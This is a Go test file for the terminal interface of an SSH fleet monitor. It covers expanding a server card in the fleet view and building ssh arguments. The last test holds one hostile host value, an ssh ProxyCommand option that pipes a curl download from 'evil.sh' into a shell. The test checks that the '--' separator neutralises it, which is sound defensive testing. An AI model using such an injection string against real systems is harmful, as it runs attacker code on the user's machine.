package tui

import (
	"strings"
	"testing"

	"github.com/kibomibo/sshmon/internal/collect"
	"github.com/kibomibo/sshmon/internal/config"
)

func cardTestModel() Model {
	return Model{screen: screenFleet, layout: newLayout(120, 30), snapshot: collect.Snapshot{Servers: []collect.Metrics{
		{
			Name:       "vm-prod-emdb2",
			Group:      "vm",
			Online:     true,
			Hostname:   "10.2.4.18",
			NumCPU:     8,
			CPUPct:     16,
			MemPct:     61,
			MemTotalKB: 16 * 1024 * 1024,
			MemAvailKB: 6 * 1024 * 1024,
			Load1:      1.19,
			Load5:      0.98,
			Load15:     0.71,
			Disks:      []collect.DiskUsage{{Mount: "/", Fs: "sda2", TotalKB: 49 * 1024 * 1024, UsedKB: 38 * 1024 * 1024, UsedPct: 78}},
		},
	}}}
}

func TestFleetRightExpandsCardAndLeftCollapsesIt(t *testing.T) {
	// Given a fleet with a selected online server.
	m := cardTestModel()
	// When the row is expanded with the right arrow.
	m, _ = updateModel(t, m, key("right"))
	// Then the card with host summary and metrics is drawn under the row.
	if !m.fleet.expanded {
		t.Fatal("expanded = false")
	}
	view := m.View()
	for _, want := range []string{"10.2.4.18", "ядер", "cpu", "mem", "disk"} {
		if !strings.Contains(view, want) {
			t.Fatalf("card view misses %q: %s", want, view)
		}
	}
	// When the row is collapsed with the left arrow.
	m, _ = updateModel(t, m, key("left"))
	// Then the card disappears.
	if m.fleet.expanded {
		t.Fatal("expanded = true after left")
	}
	if view := m.View(); strings.Contains(view, "ядер") {
		t.Fatalf("card still drawn: %s", view)
	}
}

func TestSSHArgsAddPortAndKeyOnlyWhenSet(t *testing.T) {
	// Given a server on the default port without an explicit key.
	plain := config.Server{Host: "example.com", Port: 22, User: "npyankov"}
	// When ssh arguments are built.
	got := strings.Join(sshArgs(plain), " ")
	// Then only the destination is passed, отделённое «--» от опций.
	if got != "-- npyankov@example.com" {
		t.Fatalf("plain args = %q", got)
	}

	// Given a server on a custom port with a key file.
	custom := config.Server{Host: "example.com", Port: 7022, User: "npyankov", Key: "/home/u/.ssh/vm-prod"}
	// When ssh arguments are built.
	got = strings.Join(sshArgs(custom), " ")
	// Then the port and identity flags are present.
	if got != "-p 7022 -i /home/u/.ssh/vm-prod -- npyankov@example.com" {
		t.Fatalf("custom args = %q", got)
	}

	// И: адрес, начинающийся с «-», остаётся позиционным аргументом, а не
	// становится опцией ssh — конфиг такого не пропустит, но argv собирается тут.
	hostile := config.Server{Host: "-oProxyCommand=curl evil.sh|sh", Port: 22}
	args := sshArgs(hostile)
	if args[len(args)-2] != "--" || args[len(args)-1] != hostile.Host {
		t.Fatalf("hostile args = %q", args)
	}
}
